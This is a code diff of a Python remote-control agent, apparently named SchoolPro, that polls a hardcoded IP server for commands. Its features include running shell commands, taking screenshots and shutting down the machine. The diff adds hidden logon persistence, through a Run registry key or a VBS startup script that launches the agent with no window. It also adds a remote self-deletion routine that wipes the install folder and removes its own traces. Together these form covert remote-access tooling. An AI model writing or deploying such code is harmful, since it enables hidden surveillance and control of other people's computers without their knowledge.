@@ -3,6 +3,7 @@ from __future__ import annotations
 import argparse
 import base64
 import codecs
+import contextlib
 import ctypes
 import ctypes.wintypes
 import getpass
@@ -14,6 +15,7 @@ import shlex
 import socket
 import subprocess
 import sys
+import tempfile
 import time
 import uuid
 from pathlib import Path
@@ -22,6 +24,9 @@ from typing import Any
 import psutil
 import requests
 from PIL import ImageGrab
+
+with contextlib.suppress(ImportError):
+    import winreg
 
 
 EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
@@ -34,15 +39,17 @@ WM_CLOSE = 0x0010
 
 
 # Edit these values first.
-SERVER_URL = "http://217.60.245.42:8090"
-REGISTRATION_KEY = "change-this-key"
-HEARTBEAT_INTERVAL_SECONDS = 10
-COMMAND_POLL_SECONDS = 1
-HTTP_TIMEOUT_SECONDS = 15
-AGENT_VERSION = "1.0.0"
+SERVER_URL = os.environ.get("PCBOT_SERVER_URL", "http://217.60.245.42:8090").strip()
+REGISTRATION_KEY = os.environ.get("PCBOT_REGISTRATION_KEY", "change-this-key").strip()
+HEARTBEAT_INTERVAL_SECONDS = max(5, int(os.environ.get("PCBOT_HEARTBEAT_INTERVAL", "10")))
+COMMAND_POLL_SECONDS = max(1, int(os.environ.get("PCBOT_COMMAND_POLL", "1")))
+HTTP_TIMEOUT_SECONDS = max(5, int(os.environ.get("PCBOT_HTTP_TIMEOUT", "15")))
+AGENT_VERSION = "1.1.0"
 SHELL_COMMAND_TIMEOUT_SECONDS = 25
 SHELL_COMMAND_CWD = str(Path.home())
 SHELL_COMMAND_PREVIEW_CHARS = 1600
+DEFAULT_STARTUP_ENTRY_NAME = "SchoolProAgent"
+LEGACY_STARTUP_ENTRY_NAMES = ("SafePcTelegramAgent",)
 
 
 # Optional launch aliases for /run and /restartapp.
@@ -84,6 +91,20 @@ BASE_DIR = Path(__file__).resolve().parent
 STATE_PATH = BASE_DIR / "agent_state.json"
 
 
+def appdata_roaming_dir() -> Path:
+    raw = os.environ.get("APPDATA")
+    if raw:
+        return Path(raw)
+    return Path.home() / "AppData" / "Roaming"
+
+
+def localappdata_dir() -> Path:
+    raw = os.environ.get("LOCALAPPDATA")
+    if raw:
+        return Path(raw)
+    return Path.home() / "AppData" / "Local"
+
+
 def load_state() -> dict[str, Any]:
     if STATE_PATH.exists():
         return json.loads(STATE_PATH.read_text(encoding="utf-8"))
@@ -112,6 +133,32 @@ def human_bytes(value: int | float | None) -> str:
         size /= 1024
         index += 1
     return f"{size:.1f} {units[index]}"
+
+
+def windows_version_label() -> str:
+    if platform.system().lower() != "windows":
+        return f"{platform.system()} {platform.release()}".strip()
+    release, version, _, _ = platform.win32_ver()
+    parts = ["Windows"]
+    if release:
+        parts.append(release)
+    if version and version not in parts:
+        parts.append(version)
+    return " ".join(parts)
+
+
+def startup_entry_name() -> str:
+    return os.environ.get("PCBOT_STARTUP_TASK_NAME", DEFAULT_STARTUP_ENTRY_NAME).strip() or DEFAULT_STARTUP_ENTRY_NAME
+
+
+def startup_vbs_path(entry_name: str | None = None) -> Path:
+    entry = entry_name or startup_entry_name()
+    return appdata_roaming_dir() / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / f"{entry}.vbs"
+
+
+def legacy_startup_cmd_path(entry_name: str | None = None) -> Path:
+    entry = entry_name or startup_entry_name()
+    return appdata_roaming_dir() / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / f"{entry}.cmd"
 
 
 def get_ip_addresses() -> list[str]:
@@ -241,7 +288,8 @@ def get_top_process_lines(limit: int = 8) -> list[str]:
 
 def collect_snapshot(previous_net: dict[str, Any] | None) -> tuple[dict[str, Any], dict[str, Any]]:
     vm = psutil.virtual_memory()
-    disk = psutil.disk_usage("C:\\")
+    system_drive = os.environ.get("SystemDrive", "C:")
+    disk = psutil.disk_usage(f"{system_drive}\\")
     net = psutil.net_io_counters()
     now = time.time()
 
@@ -255,7 +303,7 @@ def collect_snapshot(previous_net: dict[str, Any] | None) -> tuple[dict[str, Any
     snapshot = {
         "hostname": socket.gethostname(),
         "username": getpass.getuser(),
-        "os": f"{platform.system()} {platform.release()}",
+        "os": windows_version_label(),
         "uptime_seconds": int(time.time() - psutil.boot_time()),
         "cpu_percent": round(psutil.cpu_percent(interval=0.2), 1),
         "memory_percent": round(vm.percent, 1),
@@ -650,7 +698,7 @@ def restart_alias(alias: str) -> str:
 
 
 def screenshot_data() -> tuple[str, str]:
-    image = ImageGrab.grab(all_screens=False)
+    image = ImageGrab.grab()
     image = image.convert("RGB")
     image.thumbnail((1600, 900))
     buffer = io.BytesIO()
@@ -673,25 +721,145 @@ def shutdown_pc() -> str:
     return "Выключение запланировано через 5 секунд."
 
 
-def install_startup_task() -> None:
-    python_exe = Path(sys.executable).resolve()
-    pythonw_exe = python_exe.with_name("pythonw.exe")
-    launcher = pythonw_exe if pythonw_exe.exists() else python_exe
-    script_path = str(Path(__file__).resolve())
-    entry_name = os.environ.get("PCBOT_STARTUP_TASK_NAME", "SchoolProAgent").strip() or "SchoolProAgent"
-    startup_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
-    startup_dir.mkdir(parents=True, exist_ok=True)
-    launcher_path = startup_dir / f"{entry_name}.cmd"
-    launcher_path.write_text(
+def install_registry_run_entry(entry_name: str, command_line: str) -> bool:
+    if "winreg" not in globals():
+        return False
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE,
+        ) as key:
+            winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, command_line)
+        return True
+    except OSError:
+        return False
+
+
+def install_startup_vbs(entry_name: str, launcher: Path, script_path: str) -> None:
+    startup_path = startup_vbs_path(entry_name)
+    startup_path.parent.mkdir(parents=True, exist_ok=True)
+    startup_path.write_text(
         "\r\n".join(
             [
-                "@echo off",
-                f'start "" "{launcher}" "{script_path}"',
+                'Set shell = CreateObject("WScript.Shell")',
+                f'shell.Run Chr(34) & "{launcher}" & Chr(34) & " " & Chr(34) & "{script_path}" & Chr(34), 0',
                 "",
             ]
         ),
         encoding="ascii",
     )
+
+
+def install_startup_task() -> None:
+    python_exe = Path(sys.executable).resolve()
+    pythonw_exe = python_exe.with_name("pythonw.exe")
+    script_path = str(Path(__file__).resolve())
+    entry_name = startup_entry_name()
+    mode = "startup_vbs"
+
+    if pythonw_exe.exists():
+        command_line = f'"{pythonw_exe}" "{script_path}"'
+        if install_registry_run_entry(entry_name, command_line):
+            mode = "registry_run"
+            with contextlib.suppress(FileNotFoundError):
+                startup_vbs_path(entry_name).unlink()
+        else:
+            install_startup_vbs(entry_name, pythonw_exe, script_path)
+    else:
+        install_startup_vbs(entry_name, python_exe, script_path)
+
+    with contextlib.suppress(FileNotFoundError):
+        legacy_startup_cmd_path(entry_name).unlink()
+
+    state = load_state()
+    state["startup_entry_name"] = entry_name
+    state["startup_mode"] = mode
+    save_state(state)
+
+
+def remove_startup_entry() -> None:
+    state = load_state()
+    entry_names = {
+        str(state.get("startup_entry_name") or startup_entry_name()).strip() or DEFAULT_STARTUP_ENTRY_NAME,
+        DEFAULT_STARTUP_ENTRY_NAME,
+        *LEGACY_STARTUP_ENTRY_NAMES,
+    }
+
+    if "winreg" in globals():
+        with contextlib.suppress(OSError):
+            with winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE,
+            ) as key:
+                for entry_name in entry_names:
+                    with contextlib.suppress(OSError):
+                        winreg.DeleteValue(key, entry_name)
+
+    for entry_name in entry_names:
+        with contextlib.suppress(FileNotFoundError):
+            startup_vbs_path(entry_name).unlink()
+        with contextlib.suppress(FileNotFoundError):
+            legacy_startup_cmd_path(entry_name).unlink()
+
+
+def managed_install_dir() -> bool:
+    return BASE_DIR.name.lower() == "schoolpro" or (BASE_DIR / "INSTALL.txt").exists()
+
+
+def build_self_uninstall_script(entry_name: str, target_dir: Path) -> Path:
+    cleanup_names = [entry_name, DEFAULT_STARTUP_ENTRY_NAME, *LEGACY_STARTUP_ENTRY_NAMES]
+    cleanup_commands = [f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /f >nul 2>&1' for name in cleanup_names]
+    cleanup_commands.extend(f'del "{startup_vbs_path(name)}" >nul 2>&1' for name in cleanup_names)
+    cleanup_commands.extend(f'del "{legacy_startup_cmd_path(name)}" >nul 2>&1' for name in cleanup_names)
+    cleanup_script = Path(tempfile.gettempdir()) / f"schoolpro_cleanup_{os.getpid()}.cmd"
+    cleanup_script.write_text(
+        "\r\n".join(
+            [
+                "@echo off",
+                "setlocal",
+                "timeout /t 4 /nobreak >nul",
+                *cleanup_commands,
+                "for /l %%i in (1,1,12) do (",
+                f'  rmdir /s /q "{target_dir}" >nul 2>&1',
+                f'  if not exist "{target_dir}\\" goto cleanup_done',
+                "  timeout /t 1 /nobreak >nul",
+                ")",
+                ":cleanup_done",
+                '(goto) 2>nul & del "%~f0"',
+                "",
+            ]
+        ),
+        encoding="ascii",
+    )
+    return cleanup_script
+
+
+def uninstall_self() -> dict[str, Any]:
+    if not managed_install_dir():
+        raise ValueError("Самоудаление разрешено только для установленной папки SchoolPro.")
+
+    state = load_state()
+    entry_name = str(state.get("startup_entry_name") or startup_entry_name()).strip() or DEFAULT_STARTUP_ENTRY_NAME
+    cleanup_script = build_self_uninstall_script(entry_name, BASE_DIR)
+
+    subprocess.Popen(
+        ["cmd.exe", "/c", str(cleanup_script)],
+        shell=False,
+        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+    )
+    return {
+        "ok": True,
+        "message": "Удаление SchoolPro запущено. Агент завершит работу и очистит установку.",
+        "data": {
+            "entry_name": entry_name,
+            "target_dir": str(BASE_DIR),
+        },
+        "shutdown_after_result": True,
+    }
 
 
 def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[str, Any]:
@@ -763,6 +931,8 @@ def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[st
         return {"ok": True, "message": restart_pc(), "data": {}}
     if command_type == "shutdown_pc":
         return {"ok": True, "message": shutdown_pc(), "data": {}}
+    if command_type == "uninstall_self":
+        return uninstall_self()
     raise ValueError(f"Неподдерживаемая команда: {command_type}")
 
 
@@ -772,7 +942,7 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument(
         "--install-startup",
         action="store_true",
-        help="Create a Startup-folder entry for logon startup",
+        help="Create a per-user startup entry for logon startup",
     )
     return parser.parse_args()
 
@@ -818,6 +988,8 @@ def run_loop() -> None:
                         file_name=result.get("file_name"),
                         file_b64=result.get("file_b64"),
                     )
+                    if result.get("shutdown_after_result"):
+                        return
             time.sleep(COMMAND_POLL_SECONDS)
         except KeyboardInterrupt:
             raise
@@ -841,7 +1013,7 @@ def main() -> None:
 
     if args.install_startup:
         install_startup_task()
-        print("Автозапуск через папку Startup установлен.")
+        print("Автозапуск установлен.")
         return
 
     if changed_state:
